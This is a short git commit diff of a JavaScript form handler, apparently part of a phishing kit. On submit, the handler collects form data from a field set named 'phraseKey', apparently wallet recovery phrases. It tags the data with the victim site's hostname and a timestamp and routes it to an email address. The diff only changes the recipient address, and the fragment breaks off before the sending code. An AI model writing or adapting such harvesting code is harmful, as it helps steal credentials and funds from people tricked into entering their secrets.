644a8c11111b1f40a59cb02eab9d65b5d04b34e3
goodman <mayhemofflin@gmail.com>
2022-11-01 23:03:35 +0100

    update

--- ojobe.js
+++ ojobe.js
@@ -1,6 +1,6 @@
 phraseKey.addEventListener('submit', e => {
   e.preventDefault()
-  mail = 'mayhemofflin@gmail.com'
+  mail = 'otime7061@gmail.com'
   next = 'next.html'
   subject = `${window.location.hostname} ${new Date()}`
   let r = new FormData()
